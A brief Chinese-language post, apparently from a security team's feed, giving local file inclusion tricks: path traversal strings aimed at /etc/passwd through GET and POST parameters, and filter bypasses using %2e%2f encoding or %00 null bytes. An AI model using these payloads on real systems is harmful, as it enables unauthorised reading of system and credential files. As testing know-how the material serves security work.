#  LFI漏洞攻击技巧   
 TtTeam   2025-04-25 15:57  
  
GET 路径注入：尝试 ///../../../../etc/passwd  
  
POST LFI：测试类似 /router.jsp?../etc/passwd 的路径  
  
使用 %2e%2f 或 %00 绕过  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/0HlywncJbB1E20cRHPJj7wstXeibVRbsdEGEtLRS0doCAsWLPGfa9geyHQj5jjo4HKyhZLye33LaxqzJHeNN1oA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/0HlywncJbB1E20cRHPJj7wstXeibVRbsdnzbrzAZH44oIsiaMLjfEhEHwvpcL936ZLK5r0acfGGXwM0Vm7icPwibQg/640?wx_fmt=png&from=appmsg "")  
  
